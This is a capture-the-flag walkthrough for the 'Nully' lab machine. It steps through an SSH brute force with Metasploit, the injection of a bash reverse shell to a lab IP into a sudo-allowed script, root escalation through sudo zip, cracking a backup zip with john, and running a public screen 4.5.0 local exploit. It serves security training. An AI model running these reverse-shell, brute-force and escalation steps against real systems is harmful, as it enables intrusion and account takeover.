<pre>
[x] This machine uses Docker and Portainer so don't attack 80, 8000 and 9000 ports.

Switch between 3 containers webmail(c)-webserver(c)-database(c)

Edit hosts file
$ vi /etc/hosts/
    *Machine IP    nully.ctf

Enum:
    Open ports: [x] => ports we can not attack!
        [x] 80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
        110/tcp  open  pop3        Dovecot pop3d
        2222/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
1433/tcp closed ms-sql-s
        [x] 8000/tcp open  nagios-nsca Nagios NSCA
        [x] 9000/tcp open  cslistener?

110 pop3 enum: tree
In port 80 we will see some pop3 creds:
    To start, check your email on port 110 with authorization data 
pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
    Login via telnet
        $ telnet nully.ctf 110
        .user pentester
            +OK
        .pass qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
            +OK Logged in.
    Let’s see LIST of messages
        .LIST
            +OK 1 messages:
    1 657
        Let’s read message 1
.TOP 1 5
    *possible ssh user: Bob Smith(bob/smith)
End line from message:
    Sorry, I forgot my password, but I remember the password was simple.
        Possible ssh brute force.

2222 ssh enum: tree
Lets brute force with metasploit
    $ msfconsole
    $ use auxiliary/scanner/ssh/ssh_login
            Use this options
BLANK_PASSWORDS   false    
BRUTEFORCE_SPEED  5           
DB_ALL_CREDS      false            
   DB_ALL_PASS       false            
   DB_ALL_USERS      false            
   PASSWORD                      
   PASS_FILE         bobbywordlist
   RHOSTS            nully.ctf        
   RPORT             2222             
   STOP_ON_SUCCESS   false            
   THREADS           5                
   USERNAME          bob              
   USERPASS_FILE                      
   USER_AS_PASS      false            
   USER_FILE                          
   VERBOSE           true    
*found this creds for ssh login
    success: 'bob:bobby1985'

And login:
    $ ssh bob@nully.ctf -p 2222
bobby1985

Lets escalate container
$ sudo -l
    (my2user) NOPASSWD: /bin/bash /opt/scripts/check.sh

$vi /opt/scripts/check.sh
    Add a reverse shell in start of script:
        bash -c 'exec bash -i >& /dev/tcp/192.168.1.9/9003 0>&1'
    Add in the end of file command : whoami
        And save it!
Make a netcat listener and run the script:
    $ rlwrap nc -lvnp 9003

    Run script:
$ sudo -u my2user /bin/bash /opt/scripts/check.sh
    *And got my2user!

Lets got root privilege escalation:
    $ sudo -l
        (root) NOPASSWD: /usr/bin/zip

    $ TF=$(mktemp -u)
    $ sudo zip $TF /etc/hosts -T -TT 'sh #' 
        *And got root!

Switch to database hostname:
    $ nmap 172.17.0.1/24
        *IP: 172.17.0.5
    $ ftp
        open 172.17.0.5
            Anonymous login

    And find inside dir .backup.zip
        $ get .backup.zip
    $ cat .backup.zip | base64
        $ touch backup
            $ vi backup
*Paste base64 hash
    $ base64 -d back > file.zip
        $ zip2john file.zip > ziphash
    $ john ziphash -wordlist=rockyou.txt
        Creds: 1234567890
    $ unzip file.zip
        *And cat creds.txt
            donald:HBRLoCZ0b9NEgh8vsECS

Go to bob terminal and login via ssh:
    $ ssh donald@172.17.0.5
        HBRLoCZ0b9NEgh8vsECS

    Priv esc:
        $ find / -perm -4000 -type f -ls 2>/dev/null
            1 root     root      1860280 Aug 27 09:50 /usr/bin/screen-4.5.0
        kali$ searchsploit "screen 4.5.0"
            exploits/linux/local/41154.sh
                Mirror this exploit
        $ cd /tmp
        $ touch exploit.sh
            $ vi exploit.sh
                Paste the code from 41154.sh
        $ chmod +x exploit.sh
            And run it!
        $ ./exploit.sh
        And got root!
        
    

Flag1: 2c393307906f29ee7fb69e2ce59b4c8a
Flag2: 6cb25d4789cdd7fa1624e6356e0d825b
Flag2: 6cb25d4789cdd7fa1624e6356e0d825b                                            

Congratulations on getting the final flag!
You completed the Nully Cybersecurity CTF.
I will be glad if you leave a feedback.

</pre>
